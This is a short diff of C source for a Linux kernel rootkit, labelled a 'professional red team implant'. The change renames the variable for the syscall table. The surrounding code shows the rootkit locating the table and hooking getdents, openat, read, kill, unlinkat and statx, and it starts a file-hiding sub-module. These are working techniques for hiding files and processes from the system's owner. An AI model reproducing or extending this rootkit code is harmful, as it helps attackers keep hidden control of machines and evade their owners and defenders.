@@ -9,7 +9,7 @@ MODULE_AUTHOR(VAULT_KERNEL_AUTHOR);
 MODULE_VERSION(VAULT_KERNEL_VERSION);
 MODULE_DESCRIPTION("vault_kernel kernel rootkit — professional red team implant");
 
-unsigned long *sys_call_table = NULL;
+unsigned long *vk_sys_call_table = NULL;
 int module_hidden = 0;
 unsigned long vk_load_jiffies = 0;
 
@@ -196,20 +196,20 @@ static int __init vault_kernel_init(void) {
             VAULT_KERNEL_VERSION, VAULT_KERNEL_AUTHOR);
 
     /* 1. Find sys_call_table */
-    sys_call_table = find_sys_call_table();
-    if (!sys_call_table) {
+    vk_sys_call_table = find_sys_call_table();
+    if (!vk_sys_call_table) {
         pr_err(VAULT_KERNEL_TAG " cannot proceed without sys_call_table\n");
         return -ENODEV;
     }
 
     /* Map hook indices to syscall table entries */
-    hooks[HOOKIDX_GETDENTS64].table_entry = &sys_call_table[__NR_getdents64];
-    hooks[HOOKIDX_GETDENTS].table_entry   = &sys_call_table[__NR_getdents];
-    hooks[HOOKIDX_OPENAT].table_entry     = &sys_call_table[__NR_openat];
-    hooks[HOOKIDX_READ].table_entry       = &sys_call_table[__NR_read];
-    hooks[HOOKIDX_KILL].table_entry       = &sys_call_table[__NR_kill];
-    hooks[HOOKIDX_UNLINKAT].table_entry   = &sys_call_table[__NR_unlinkat];
-    hooks[HOOKIDX_STATX].table_entry      = &sys_call_table[__NR_statx];
+    hooks[HOOKIDX_GETDENTS64].table_entry = &vk_sys_call_table[__NR_getdents64];
+    hooks[HOOKIDX_GETDENTS].table_entry   = &vk_sys_call_table[__NR_getdents];
+    hooks[HOOKIDX_OPENAT].table_entry     = &vk_sys_call_table[__NR_openat];
+    hooks[HOOKIDX_READ].table_entry       = &vk_sys_call_table[__NR_read];
+    hooks[HOOKIDX_KILL].table_entry       = &vk_sys_call_table[__NR_kill];
+    hooks[HOOKIDX_UNLINKAT].table_entry   = &vk_sys_call_table[__NR_unlinkat];
+    hooks[HOOKIDX_STATX].table_entry      = &vk_sys_call_table[__NR_statx];
 
     /* 2. Init sub-modules */
     if ((ret = file_hide_init()))   goto err;
